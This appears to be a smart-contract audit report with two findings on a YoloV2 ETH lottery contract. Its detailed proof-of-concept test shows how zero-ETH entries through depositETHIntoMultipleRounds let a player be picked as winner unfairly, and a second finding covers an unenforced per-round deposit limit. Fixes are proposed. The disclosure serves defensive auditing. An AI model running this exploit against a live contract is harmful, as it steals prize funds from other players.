# Title 1: Players can raise their opportunities unfairly to be a winner by depositing 0 eth to rounds using `depositETHIntoMultipleRounds` function.

## Severity
High

## Summary
Players can deposit `0 eth` to any round they want including current open round and upcoming rounds. This gives players extra and unfair opportunities to be a winner.

## Vulnerability Detail
Using `depositETHIntoMultipleRounds`, players can deposit ETH into multiple rounds in a single transaction. In this function, they check validation that received ether and length of passed parameter `amounts` is greater than 0.
```solidity
    function depositETHIntoMultipleRounds(uint256[] calldata amounts) external payable nonReentrant whenNotPaused {
        uint256 numberOfRounds = amounts.length;
@>      if (msg.value == 0 || numberOfRounds == 0) {
@>          revert ZeroDeposits();
@>      }

        uint256 startingRoundId = roundsCount;
        Round storage startingRound = rounds[startingRoundId];
        _validateRoundIsOpen(startingRound);

        _setCutoffTimeIfNotSet(startingRound);

        uint256 expectedValue;
        uint256[] memory entriesCounts = new uint256[](numberOfRounds);

        for (uint256 i; i < numberOfRounds; ++i) {
            uint256 roundId = _unsafeAdd(startingRoundId, i);
            Round storage round = rounds[roundId];
            uint256 roundValuePerEntry = round.valuePerEntry;
            if (roundValuePerEntry == 0) {
                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});
            }

            _incrementUserDepositCount(roundId, round);

            uint256 depositAmount = amounts[i];
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);
            expectedValue += depositAmount;

            entriesCounts[i] = entriesCount;
        }

        if (expectedValue != msg.value) {
            revert InvalidValue();
        }

        emit MultipleRoundsDeposited(msg.sender, startingRoundId, amounts, entriesCounts);

        if (
            _shouldDrawWinner(
                startingRound.numberOfParticipants,
                startingRound.maximumNumberOfParticipants,
                startingRound.deposits.length
            )
        ) {
            _drawWinner(startingRound, startingRoundId);
        }
    }
```
However, this function does not individually check whether the amount deposited to each round is greater than 0. This allows players to deposit `0 eth` to any round they want, either the current open round or upcoming rounds.

Therefore, if we assume that new round is opened with valuePerEntry of `0.01 eth`, then it is possible to perform following problem.

1. Alice deposits `0.01 eth` to the opened round. 
2. Bob(malicious player) calls `depositETHIntoMultipleRounds` function with params `amounts` as `[0, 0.01 eth]`. This means that Bob deposits `0 eth` to current opened round, `0.01 eth` to the next round. Of course, he should pay `0.01 eth` to this function.
3. Charlie deposits `0.02 eth` to the opened round.
4. Bob calls `depositETHIntoMultipleRounds` function again with same info of previous one.

To avoid complexity, let's assume that this round would be drawn in this situation.
In this situation, total entries of the round is 3 and length of `round.deposits` is 4.
After random number is arrived from VRF, the callback function `fulfillRandomWords` is called to decide the winner.
```solidity
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        if (randomnessRequests[requestId].exists) {
            uint256 roundId = randomnessRequests[requestId].roundId;
            Round storage round = rounds[roundId];

            if (round.status == RoundStatus.Drawing) {
                round.status = RoundStatus.Drawn;
                uint256 randomWord = randomWords[0];
                randomnessRequests[requestId].randomWord = randomWord;

                uint256 count = round.deposits.length;
                uint256[] memory currentEntryIndexArray = new uint256[](count);
                for (uint256 i; i < count; ++i) {
                    currentEntryIndexArray[i] = uint256(round.deposits[i].currentEntryIndex);
                }

                uint256 currentEntryIndex = currentEntryIndexArray[_unsafeSubtract(count, 1)];
                uint256 winningEntry = _unsafeAdd(randomWord % currentEntryIndex, 1);
@>              round.winner = round.deposits[currentEntryIndexArray.findUpperBound(winningEntry)].depositor;
                round.protocolFeeOwed = (round.valuePerEntry * currentEntryIndex * round.protocolFeeBp) / 10_000;

                emit RoundStatusUpdated(roundId, RoundStatus.Drawn);

                _startRound({_roundsCount: roundId});
            }
        }
    }
```
`currentEntryIndexArray` is a array that saves the entry index of every deposit struct sequently. And in above situation its value is as follow:
```
[1, 1, 3, 3]
```
And the depositors of to each element of above array are as follow:
```
[
    1 => Alice,
    1 => Bob,
    3 => Charlie,
    3 => Bob,
]
```
As you can see, since Bob deposited `0 eth` to opened round, there are duplicated values in this array. Winner is decided by finding the first index that its entry index is greater or equal to received random number in above array. 

But the problem is occured in this step. If the received random number is equal to an element of `currentEntryIndexArray`, the `findUpperBound` function doesn't return the first element's index that is equal to the random number due to function's internal logic. In other words, when the received random number is 1 or 3, the winner would be selected as Bob unfairly not Alice or Charlie.

I wrote the test file for PoC as follow.
```solidity
contract UnfairWinnerSeletedTest is TestHelpers {
    address public alice = address(101);
    address public bob = address(102);
    address public charlie = address(103);

    function setUp() public {
        _forkMainnet();
        _deployYolo();
        _subscribeYoloToVRF();
    }

    function test_depositWithZeroAmountUsingBatchDeposit(uint256 randomWord) public {
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.deal(charlie, 1 ether);

        vm.startPrank(alice);
        yolo.deposit{value: 0.01 ether}(1, _emptyDepositsCalldata());

        IYoloV2.Deposit[] memory deposits = _getDeposits(1);
        assertEq(deposits.length, 1);

        IYoloV2.Deposit memory deposit = deposits[0];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0.01 ether);
        assertEq(deposit.depositor, alice);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 1);

        vm.stopPrank();

        vm.startPrank(bob);
        yolo.depositETHIntoMultipleRounds{value: 0.01 ether}(_amounts());

        deposits = _getDeposits(1);
        assertEq(deposits.length, 2);

        deposit = deposits[1];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0 ether);
        assertEq(deposit.depositor, bob);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 1);

        vm.stopPrank();

        vm.startPrank(charlie);
        yolo.deposit{value: 0.02 ether}(1, _emptyDepositsCalldata());

        deposits = _getDeposits(1);
        assertEq(deposits.length, 3);

        deposit = deposits[2];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0.02 ether);
        assertEq(deposit.depositor, charlie);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 3);

        vm.stopPrank();

        vm.startPrank(bob);
        yolo.depositETHIntoMultipleRounds{value: 0.01 ether}(_amounts());

        deposits = _getDeposits(1);
        assertEq(deposits.length, 4);

        deposit = deposits[3];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0 ether);
        assertEq(deposit.depositor, bob);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 3);

        vm.stopPrank();

        vm.prank(VRF_COORDINATOR);

        // According to `fulfillRandomWords` function, following assumption means that `winningEntry` becomes 1 or 3 (in other words, winner should be alice or charlie fairly, but...)
        vm.assume(randomWord % 3 == 0 || randomWord % 3 == 2);
        
        uint256[] memory randomWords = new uint256[](1);
        randomWords[0] = randomWord;

        vm.warp(block.timestamp + ROUND_DURATION);
        yolo.drawWinner();
        
        vm.prank(VRF_COORDINATOR);
        VRFConsumerBaseV2(yolo).rawFulfillRandomWords(FULFILL_RANDOM_WORDS_REQUEST_ID, randomWords);

        (
            IYoloV2.RoundStatus status, , , , , , address winner, , ,
        ) = yolo.getRound(1);
        assertEq(uint8(status), uint8(IYoloV2.RoundStatus.Drawn));
        assertEq(winner, bob);
    }

    function _amounts() private pure returns (uint256[] memory amounts) {
        amounts = new uint256[](2);
        amounts[0] = 0 ether;
        amounts[1] = 0.01 ether;
    }
}
```
As I wrote in comments of test, when the received `randomWord` is 0 or 2, the winner should be alice or charlie according to the `fulfillRandomWords` function. But winner is selected as Bob.
Bob is selected as a winner in current round without depositing actual ether. The `0.02 eth` which he deposited in couple of `depositETHIntoMultipleRounds` function calling will be used to raise his fair opportunity that can be selected as winner in next round.

Due to this issue, players may consciously attempt to routinely use `depositETHIntoMultipleRounds` to gain unfair opportunity of winning. Also, by depositing 0 ether not only to the current round but also to upcoming rounds, they may have steal the winning chances of others who deposited before.

## Impact
Players can raise their winning chance unfairly by depositing `0 eth` to the rounds using `depositETHIntoMultipleRounds` function.

## Code Snippet

I mentioned related code snippets in Vulnerability Detail.

## Tool used

Manual Review

## Recommendation
In `depositETHIntoMultipleRounds` function, you should check if each deposit amount is greater than 0.
```diff
        for (uint256 i; i < numberOfRounds; ++i) {
            uint256 roundId = _unsafeAdd(startingRoundId, i);
            Round storage round = rounds[roundId];
            uint256 roundValuePerEntry = round.valuePerEntry;
            if (roundValuePerEntry == 0) {
                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});
            }

            _incrementUserDepositCount(roundId, round);

            uint256 depositAmount = amounts[i];
+           if (depositAmount == 0) {
+               revert ZeroDeposits();
+           }
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);
            expectedValue += depositAmount;

            entriesCounts[i] = entriesCount;
        }
```

And you'd better update the `findUpperBound` function of `libraries/Arrays.sol` contract(out of scope) to select the right index when the target is equal with an element of array.


# Title 2: Since `_depositEth` function doesn't check if the number of deposits reaches the maximum limit of the round, the round may wouldn't be drawn when it should be.

## Severity
Medium

## Summary
Since `_depositEth` function has no checking that maximum number of deposits is reached, the round may wouldn't be drawn when it should be.

## Vulnerability Detail
The opened round should be drawn when the maximum number of deposits is reached and number of participants is equal to or greater than 2.
```javascript
    function _shouldDrawWinner(
        uint256 numberOfParticipants,
        uint256 maximumNumberOfParticipants,
        uint256 roundDepositCount
    ) private pure returns (bool shouldDraw) {
        shouldDraw =
            numberOfParticipants == maximumNumberOfParticipants ||
            (numberOfParticipants > 1 && roundDepositCount == MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND);
    }
```
Players can deposit eth to multiple rounds by calling `depositETHIntoMultipleRounds`. Also, this function calls `_depositEth` private function.
```javascript
    function depositETHIntoMultipleRounds(uint256[] calldata amounts) external payable nonReentrant whenNotPaused {
        uint256 numberOfRounds = amounts.length;
        if (msg.value == 0 || numberOfRounds == 0) {
            revert ZeroDeposits();
        }

        uint256 startingRoundId = roundsCount;
        Round storage startingRound = rounds[startingRoundId];
        _validateRoundIsOpen(startingRound);

        _setCutoffTimeIfNotSet(startingRound);

        uint256 expectedValue;
        uint256[] memory entriesCounts = new uint256[](numberOfRounds);

        for (uint256 i; i < numberOfRounds; ++i) {
            uint256 roundId = _unsafeAdd(startingRoundId, i);
            Round storage round = rounds[roundId];
            uint256 roundValuePerEntry = round.valuePerEntry;
            if (roundValuePerEntry == 0) {
                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});
            }

            _incrementUserDepositCount(roundId, round);

            uint256 depositAmount = amounts[i];
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
@>          uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);
            expectedValue += depositAmount;

            entriesCounts[i] = entriesCount;
        }

        if (expectedValue != msg.value) {
            revert InvalidValue();
        }

        emit MultipleRoundsDeposited(msg.sender, startingRoundId, amounts, entriesCounts);

        if (
            _shouldDrawWinner(
                startingRound.numberOfParticipants,
                startingRound.maximumNumberOfParticipants,
                startingRound.deposits.length
            )
        ) {
            _drawWinner(startingRound, startingRoundId);
        }
    }
```
However, it doesn't check the maximum number of deposits of the round is reached. `depositETHIntoMultipleRounds` has checking that the current open round should be drawn but this is restriced to only current open round. Therefore, players can deposit to upcoming rounds bypassing the restriction.
If the current number of deposits of upcoming round exceeds the maximum number before opening, the round should be drawn as soon as it is opened. However, in `_shouldDrawWinner` function, it just checks that the current number of deposits is equal to maximum number.
As the result, the round isn't drawn and players will continue to deposit to the round.
```javascript
    function _shouldDrawWinner(
        uint256 numberOfParticipants,
        uint256 maximumNumberOfParticipants,
        uint256 roundDepositCount
    ) private pure returns (bool shouldDraw) {
        shouldDraw =
            numberOfParticipants == maximumNumberOfParticipants ||
@>          (numberOfParticipants > 1 && roundDepositCount == MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND);
    }
```

## Impact
Since the depositing by calling `depositETHIntoMultipleRounds` function doesnt' check that maximum number of deposits is reached, players can deposit to upcoming rounds bypassing restriction of maximum number of deposits and it makes the round cannot be drawn when it should be.

## Tool used

Manual Review

## Recommendation

Add the checking that the maximum number of deposits is reached to the `depositEth` function as well as `_deposit` function.
```diff
    function _depositETH(
        Round storage round,
        uint256 roundId,
        uint256 roundValuePerEntry,
        uint256 depositAmount
    ) private returns (uint256 entriesCount) {
        entriesCount = depositAmount / roundValuePerEntry;
        uint256 roundDepositCount = round.deposits.length;

        _validateOnePlayerCannotFillUpTheWholeRound(_unsafeAdd(roundDepositCount, 1), round.numberOfParticipants);

+       if (_unsafeAdd(roundDepositCount, 1) > MAXIMUM_NUMBER_OF_DEPOSITS_PER_ROUND) {
+           revert MaximumNumberOfDepositsReached();
+       }
        uint40 currentEntryIndex = _getCurrentEntryIndexWithoutAccrual(round, roundDepositCount, entriesCount);
        // This is equivalent to
        // round.deposits.push(
        //     Deposit({
        //         tokenType: YoloV2__TokenType.ETH,
        //         tokenAddress: address(0),
        //         tokenId: 0,
        //         tokenAmount: msg.value,
        //         depositor: msg.sender,
        //         withdrawn: false,
        //         currentEntryIndex: currentEntryIndex
        //     })
        // );
        // unchecked {
        //     roundDepositCount += 1;
        // }
        uint256 roundDepositsLengthSlot = _getRoundSlot(roundId) + ROUND__DEPOSITS_LENGTH_SLOT_OFFSET;
        uint256 depositDataSlotWithCountOffset = _getDepositDataSlotWithCountOffset(
            roundDepositsLengthSlot,
            roundDepositCount
        );
        // We don't have to write tokenType, tokenAddress, tokenId, and withdrawn because they are 0.
        _writeDepositorAndCurrentEntryIndexToDeposit(depositDataSlotWithCountOffset, currentEntryIndex);
        _writeDepositAmountToDeposit(depositDataSlotWithCountOffset, depositAmount);
        assembly {
            sstore(roundDepositsLengthSlot, add(roundDepositCount, 1))
        }
    }
```
